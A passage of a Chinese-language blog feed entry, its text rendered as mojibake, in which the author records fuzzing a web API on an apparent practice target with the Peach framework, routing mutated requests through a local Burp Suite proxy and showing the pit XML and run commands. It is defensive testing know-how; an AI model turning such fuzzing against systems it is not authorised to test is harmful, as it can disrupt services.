../peach.xsd&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- å¼•å…¥çŠ¶æ€æ¨¡å‹ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Include</span> <span class="attr">ns</span>=<span class="string">&quot;MyState&quot;</span> <span class="attr">src</span>=<span class="string">&quot;D:\\Fuzzâ€”â€”peach\\MyPeachPit\\3-my_state.xml&quot;</span> /&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">Agent</span> <span class="attr">name</span>=<span class="string">&quot;LocalAgent&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Agent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Test</span> <span class="attr">name</span>=<span class="string">&quot;Default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Agent</span> <span class="attr">ref</span>=<span class="string">&quot;LocalAgent&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">StateModel</span> <span class="attr">ref</span>=<span class="string">&quot;MyState:My_State&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">Publisher</span> <span class="attr">class</span>=<span class="string">&quot;Tcp&quot;</span> <span class="attr">name</span>=<span class="string">&quot;tcp&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- ä¸ºBurpSuiteä»£ç†ip --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Param</span> <span class="attr">name</span>=<span class="string">&quot;Host&quot;</span> <span class="attr">value</span>=<span class="string">&quot;127.0.0.1&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Param</span> <span class="attr">name</span>=<span class="string">&quot;Port&quot;</span> <span class="attr">value</span>=<span class="string">&quot;8080&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Param</span> <span class="attr">name</span>=<span class="string">&quot;Timeout&quot;</span> <span class="attr">value</span>=<span class="string">&quot;5000&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Publisher</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">Logger</span> <span class="attr">class</span>=<span class="string">&quot;File&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Param</span> <span class="attr">name</span>=<span class="string">&quot;Path&quot;</span> <span class="attr">value</span>=<span class="string">&quot;##LogPath##&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Logger</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Peach</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åŒæ—¶ä¿®æ”¹BurpSuiteä¸Šçš„ä»£ç†ä¿¡æ¯ï¼Œipå’Œç«¯å£ä¸ç”¨æ”¹ï¼Œåªéœ€å°†å…¶é‡å®šä½è‡³ç›®æ ‡é¶æœºï¼Œå¦‚ä¸‹å›¾ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/191931/20/33255/92329/63f30e6fF8ef6d164/475421ea9573964f.png" style="zoom: 67%;" /><h3 id="6-æœ€åæ£€éªŒæµ‹è¯•å¥—æ˜¯å¦æ­£ç¡®"><a href="#6-æœ€åæ£€éªŒæµ‹è¯•å¥—æ˜¯å¦æ­£ç¡®" class="headerlink" title="6. æœ€åæ£€éªŒæµ‹è¯•å¥—æ˜¯å¦æ­£ç¡®"></a>6. æœ€åæ£€éªŒæµ‹è¯•å¥—æ˜¯å¦æ­£ç¡®</h3><p>åœ¨å…¶ç›®å½•ä¸‹è¾“å…¥ä»¥ä¸‹å‘½ä»¤<code>peach 4-my_integrate.xml -1</code>ï¼Œå‡ºç°ä¸‹å›¾å°±è¯´æ˜é…ç½®æˆåŠŸäº†ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/123158/8/35793/67146/63f3107cF0548a812/8c4610fcb5dc6a2d.png" style="zoom:80%;" /><h3 id="7-å¼€å§‹fuzz"><a href="#7-å¼€å§‹fuzz" class="headerlink" title="7. å¼€å§‹fuzz"></a>7. å¼€å§‹fuzz</h3><p>è¾“å…¥å‘½ä»¤<code>peach 4-my_integrate.xml -range 1,150000</code></p><p>æ„ä¸ºå‘é€15wä¸ªå˜å¼‚æŠ¥æ–‡ï¼Œ15wä¸ºå®˜æ–¹æ¨èæ•°é‡ã€‚</p><p>æ³¨ï¼šè®°å¾—å…³æ‰ intercept æˆªå¬å™¨ï¼Œå¦åˆ™å¾—ä¸€ä¸ªä¸ªæŒ‰forwardå‘é€è¯·æ±‚æŠ¥æ–‡ï¼Œæœ€ååœ¨Http Historyç•Œé¢ç­›é€‰å¼‚å¸¸æŠ¥æ–‡å³å¯ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä½œä¸ºä¸€åèœé¸¡äºŒè¿›åˆ¶æ‰‹ï¼Œå­¦åˆ°äº†æŒºå¤šçš„webçŸ¥è¯†ï¼Œä¹ŸæŒºå¥½ã€‚åœ¨å®è·µä¸­ç¨å¾®ç†Ÿæ‚‰äº†peachæ¡†æ¶çš„æ„å»ºæµç¨‹ã€‚</p><p>ä¸è¿‡ä¹Ÿé‡åˆ°äº†å¾ˆå¤šé—®é¢˜ï¼Œå°±æ˜¯â€Content-Lengthâ€çš„å€¼çš„é—®é¢˜ï¼Œå› ä¸ºé•¿åº¦å¦‚æœä¸€ç›´æ˜¯å›ºå®šçš„è¯å‘é€çš„è¯·æ±‚å¤´è¯¥æ€ä¹ˆè¿›è¡Œé•¿åº¦å˜å¼‚ï¼Ÿä¸è¿‡åœ¨æ£€æµ‹æŠ¥æ–‡æ—¶è¿˜æ˜¯è§‚å¯Ÿåˆ°æŸäº›è¯·æ±‚æŠ¥æ–‡çš„â€Content-Lengthâ€æ˜¯ä¼šæ”¹å˜çš„ï¼Œä¸è¿‡æ˜¯æå°‘æ•°ï¼Œå¦‚ä¸‹ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/138332/21/29339/258119/63f31074Fab9ff6f9/8a782e9e75153d37.png" style="zoom:80%;" /><p>å¤§éƒ¨åˆ†æ˜¯ç¼ºå‚æ•°çš„ï¼Œå¦‚ä¸‹ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/111442/11/31651/192774/63f31074F6b9a25a5/0c9623296ed13b49.png" style="zoom: 67%;" /><p>æ‰“ç®—æ˜å¤©æ”¹è¿›ä¸€ä¸‹DataModelè¿™æ ·å­ã€‚</p><hr><p>éš”å¤©å®è·µäº†ä¸€ä¸‹ï¼Œå‘ç°å°†binä¸­å’Œdatamodelä¸­çš„â€Content-Lengthâ€æ”¹å¤§åï¼Œå°±ä¾‹å¦‚æˆ‘è®¾ç½®äº†1000ï¼Œé‚£ä¹ˆæˆ‘çš„è¯·æ±‚ä½“çš„é•¿åº¦èŒƒå›´ä¾¿æ˜¯[0,1000]ï¼ŒèŒƒå›´è®¾ç½®è¶Šå¤§è¶Šå¥½ã€‚å¦‚æˆ‘æ‰€æ–™ï¼Œå˜å¼‚è¯·æ±‚ä½“çš„é•¿åº¦å˜åŒ–äº†å¾ˆå¤šï¼Œä¹Ÿå°è¯äº†æˆ‘å‰å‡ å¤©çš„æ€è€ƒã€‚åŒæ—¶æˆ‘è¿˜ä¿®æ”¹äº†å‚æ•°authorizationçš„å€¼ä¸ºå¯å˜ã€‚è™½ç„¶ä»ç„¶è·‘ä¸å‡ºå¼‚å¸¸ç»“æœå°±å¯¹äº†ã€‚ï¼ˆå½“ç„¶å¾ˆæœ‰å¯èƒ½æ˜¯è¿™é“é¢˜çš„è€ƒç‚¹å°±ä¸åœ¨è¿™é‡Œï¼‰ã€‚ä»¥ä¸‹æ˜¯ä»Šå¤©è·‘å‡ºçš„å„ç±»å˜å¼‚è¯·æ±‚ä½“ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/32032/12/21330/196376/63f3108fFd6f8f835/a1fa56905ef5b86b.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/106804/13/25217/180378/63f31074F30ae7716/f2c31195589d6f73.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/138287/24/33317/131526/63f3116bF492f304c/deda6ef59252705d.png"  /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/198394/7/30757/129740/63f31146F6a2daa04/160c56927739fa38.png"  /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/110505/27/35272/79810/63f31147F55d19a83/91cc7631539cb7fa.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/185169/19/29635/140331/63f31159Ff819f253/47d04247431b6e8f.png"  />]]></content>
    
    
    <summary type="html">&lt;p&gt;ç½‘ä¸Šå…³äºpeachæ¡†æ¶çš„èµ„æ–™å°‘çš„å¯æ€œã€‚æœ€åè·Ÿç€ä¸€ä½åšä¸»çš„åšå®¢å­¦äº†ä¸‹æ¥ï¼Œä¸è¿‡å­¦çš„æ˜¯Fuzz Web Apiã€‚å°±æ˜¯ä¸‹é¢çš„åšå®¢ã€‚æ„Ÿè°¢å¤§ä½¬ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_27446553/article/details/103278465?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-4.no_search_link&amp;spm=1001.2101.3001.4242.3&amp;utm_relevant_index=7&quot;&gt;PeachåŸç†ç®€ä»‹ä¸å®æˆ˜ï¼šä»¥Fuzz Web APIä¸ºä¾‹&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æ¥ä¸‹æ¥å°±ç®€å•è®°å½•ä¸€ä¸‹ä»Šå¤©ä¸‹åˆå¯¹peachæ¡†æ¶çš„ç²—æµ…å°è¯•ã€‚&lt;/p&gt;
&lt;h3 id=&quot;ä»¥ä¸‹æ˜¯å·¥ä½œæ–‡ä»¶å¤¹å’Œæˆæœå±•ç¤º&quot;&gt;&lt;a href=&quot;#ä»¥ä¸‹æ˜¯å·¥ä½œæ–‡ä»¶å¤¹å’Œæˆæœå±•ç¤º&quot; class=&quot;headerlink&quot; title=&quot;ä»¥ä¸‹æ˜¯å·¥ä½œæ–‡ä»¶å¤¹å’Œæˆæœå±•ç¤º&quot;&gt;&lt;/a&gt;ä»¥ä¸‹æ˜¯å·¥ä½œæ–‡ä»¶å¤¹å’Œæˆæœå±•ç¤º&lt;/h3&gt;</summary>
    
    
    
    <category term="fuzz" scheme="http://example.com/categories/fuzz/"/>
    
    
  </entry>
  
</feed>
